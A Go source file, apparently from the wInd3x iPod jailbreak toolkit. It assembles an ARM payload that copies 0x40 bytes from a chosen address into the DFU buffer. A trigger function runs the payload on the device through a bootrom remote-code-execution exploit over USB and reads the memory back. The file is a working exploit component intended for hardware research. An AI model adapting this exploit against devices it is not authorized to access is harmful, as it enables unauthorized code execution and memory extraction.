package dumpmem

import (
	"bytes"
	"encoding/binary"
	"fmt"

	"github.com/google/gousb"

	"github.com/freemyipod/wInd3x/pkg/dfu"
	"github.com/freemyipod/wInd3x/pkg/exploit"
	"github.com/freemyipod/wInd3x/pkg/uasm"
)

// Payload creates a payload which:
// - loads 32 bits from the DFU buffer and interprets is as a src addr
// - loads 0x40 bytes from the src addr and copies them to the DFU
//   buffer
func Payload(ep *exploit.Parameters) ([]byte, error) {
	insns := ep.DisableICache
	insns = append(insns,
		// Load offset
		uasm.Ldr{Dest: uasm.R0, Src: uasm.Constant(ep.DFUBufAddr)},
		uasm.Ldr{Dest: uasm.R1, Src: uasm.Deref(uasm.R0, 0)},

		// Copy 0x40 bytes from R1 to R0.
		uasm.Mov{Dest: uasm.R2, Src: uasm.Immediate(0)},

		uasm.Label("loop"),
		uasm.Ldrb{Dest: uasm.R3, Src: uasm.Deref(uasm.R1, 0)},
		uasm.Strb{Src: uasm.R3, Dest: uasm.Deref(uasm.R0, 0)},
		uasm.Add{Dest: uasm.R0, Src: uasm.R0, Compl: uasm.Immediate(1)},
		uasm.Add{Dest: uasm.R1, Src: uasm.R1, Compl: uasm.Immediate(1)},
		uasm.Add{Dest: uasm.R2, Src: uasm.R2, Compl: uasm.Immediate(1)},
		uasm.Cmp{A: uasm.R2, B: uasm.Immediate(0x40)},
		uasm.B{Cond: uasm.NE, Dest: uasm.LabelRef("loop")},
	)
	insns = append(insns, ep.HandlerFooter...)
	payload := uasm.Program{
		Address: ep.ExecAddr,
		Listing: insns,
	}

	return payload.Assemble(), nil
}

func Trigger(usb *gousb.Device, ep *exploit.Parameters, addr uint32) ([]byte, error) {
	if err := dfu.Clean(usb); err != nil {
		return nil, fmt.Errorf("clean failed: %w", err)
	}
	payload, err := Payload(ep)
	if err != nil {
		return nil, fmt.Errorf("failed to generate payload: %w", err)
	}

	addrBuf := bytes.NewBuffer(nil)
	binary.Write(addrBuf, binary.LittleEndian, addr)
	if err := exploit.RCE(usb, ep, payload, addrBuf.Bytes()); err != nil {
		return nil, fmt.Errorf("failed to execute dump payload: %w", err)
	}

	resBuf := make([]byte, 0x40)
	n, err := usb.Control(0xa1, uint8(dfu.RequestUpload), 0, 0, resBuf)
	if err != nil {
		return nil, fmt.Errorf("failed to read data: %w", err)
	}
	if n != 0x40 {
		return nil, fmt.Errorf("only got %x bytes", n)
	}

	// HACK: Detect vulnerability not triggering (the request buffer will be
	// the same as the response buffer).
	//
	// TODO(q3k): move this over to the RCE function
	reqBuf := append(addrBuf.Bytes(), bytes.Repeat([]byte{'Z'}, 60)...)
	if bytes.Equal(resBuf, reqBuf) {
		return nil, fmt.Errorf("vulnerability didn't trigger - try restarting the device")
	}

	return resBuf, nil
}
